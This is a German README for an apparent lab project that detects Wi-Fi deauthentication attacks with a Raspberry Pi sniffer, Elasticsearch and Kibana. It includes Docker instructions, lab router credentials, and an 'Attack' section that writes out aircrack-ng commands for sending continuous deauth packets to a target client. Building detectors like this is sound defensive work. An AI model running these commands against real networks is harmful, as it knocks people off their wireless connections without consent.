# Eingesetzte Technologien
- Pi-Sniff > Python-Skript (Scapy)
    - Schranke mit aircrack-ng ausloten
- Server-DB > Elasticsearch
- Server-GUI > Kibana

# Dashboard
- Pie-Chart
- Heat-Map (MAC-Adresse Angreifer nach Zeit in bestimmter Granularität)
- Bar-Chart (MAC-Adresse x # Packete absolut)
- Bar-Chart (MAC-Adresse x # Packete normalisiert)

# Zugangsdaten
## Router
- Web-UI: root:supersecurepassword
- WLAN: DancingRainbows:supersecurepassword

# Attack
## Monitor Mode starten
`airmon-ng start wlan0`

## MAC-Adressen von AP und Target herausfinden
`airodump-ng wlan0`

## Senden von Deauth-Packets
`aireplay-ng -0 0 -a <AP-MAC> -c <Target(Client)-MAC> wlan0`

# Log-File
New-line getrennte JSON-Objekte mit der Form:
`{'timestamp': 1682011162.6059976, 'reciever': 'aa:bb:cc:11:22:33', 'source': 'aa:bb:cc:11:22:34', 'bssid': 'aa:bb:cc:11:22:35', 'attack_uuid': UUID('75d183a8-7861-4c6e-9e03-37ddbb3156ca')}`

# Python
## Install requirements
`pip install -r requirements.txt`

## Run
Skript muss mit `sudo` ausgeführt werden, um auf NIC zugreifen zu können.

# Docker
## Build image
`docker build -t pinkfluffyunicorn:dev -f "$(pwd)/Kali.Dockerfile" .`

## Start image
Interface als Environment übergeben.

`docker run --privileged -it --network host --env IFACE=wlan0 pinkfluffyunicorn:dev /bin/bash`

## Aufräumen
Alle container zeigen

`docker ps`

Alle images zeigen

`docker images`

Bestimmte images löschen
(hashes durch `docker images` suchen)

`docker rmi imagehash1 imagehash2 imagehash3 ...`

oder mit Namen
`docker rmi pinkfluffyunicorn:dev`

# Docker Compose

## .env

Beinhaltet Environment-Daten für das Docker-Compose-Skript.

## Build

`docker compose build`

## Run

`docker compose up`

## Open shell

`docker exec -it pinkfluff /bin/bash`
